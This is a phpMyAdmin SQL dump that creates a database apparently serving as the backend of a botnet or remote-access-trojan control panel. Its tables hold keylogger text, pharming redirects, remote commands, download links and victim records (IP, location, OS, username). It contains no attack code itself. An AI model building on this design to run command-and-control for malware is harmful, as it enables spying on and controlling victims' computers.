-- phpMyAdmin SQL Dump
-- version 4.0.4
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Sep 07, 2015 at 01:43 PM
-- Server version: 5.6.12-log
-- PHP Version: 5.4.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `bot`
--
CREATE DATABASE IF NOT EXISTS `bot` DEFAULT CHARACTER SET utf8 COLLATE utf8_persian_ci;
USE `bot`;

-- --------------------------------------------------------

--
-- Table structure for table `bchat`
--

CREATE TABLE IF NOT EXISTS `bchat` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `schat` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bcommand`
--

CREATE TABLE IF NOT EXISTS `bcommand` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `sinput` text COLLATE utf8_persian_ci NOT NULL,
  `soutput` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bdownloader`
--

CREATE TABLE IF NOT EXISTS `bdownloader` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `slink` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bkeylogger`
--

CREATE TABLE IF NOT EXISTS `bkeylogger` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `stext` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE IF NOT EXISTS `blogs` (
  `blog` text COLLATE utf8_persian_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci;

--
-- Dumping data for table `blogs`
--

INSERT INTO `blogs` (`blog`) VALUES
('-----');

-- --------------------------------------------------------

--
-- Table structure for table `bpharming`
--

CREATE TABLE IF NOT EXISTS `bpharming` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `sip` text COLLATE utf8_persian_ci NOT NULL,
  `sweb` text COLLATE utf8_persian_ci NOT NULL,
  `scode` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bscreen`
--

CREATE TABLE IF NOT EXISTS `bscreen` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `swidth` int(11) NOT NULL,
  `shight` int(11) NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bscript`
--

CREATE TABLE IF NOT EXISTS `bscript` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `scode` text COLLATE utf8_persian_ci NOT NULL,
  `sformat` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bserver`
--

CREATE TABLE IF NOT EXISTS `bserver` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `scommand` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `btask`
--

CREATE TABLE IF NOT EXISTS `btask` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `stask` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `buser`
--

CREATE TABLE IF NOT EXISTS `buser` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `sname` varchar(50) COLLATE utf8_persian_ci NOT NULL,
  `sip` text COLLATE utf8_persian_ci NOT NULL,
  `slocation` text COLLATE utf8_persian_ci NOT NULL,
  `sops` text COLLATE utf8_persian_ci NOT NULL,
  `sinstall` text COLLATE utf8_persian_ci NOT NULL,
  `sonline` datetime NOT NULL,
  `sorder` text COLLATE utf8_persian_ci NOT NULL,
  `sloc` text COLLATE utf8_persian_ci NOT NULL,
  `susername` text COLLATE utf8_persian_ci NOT NULL,
  PRIMARY KEY (`sname`),
  KEY `sid` (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_persian_ci AUTO_INCREMENT=1 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
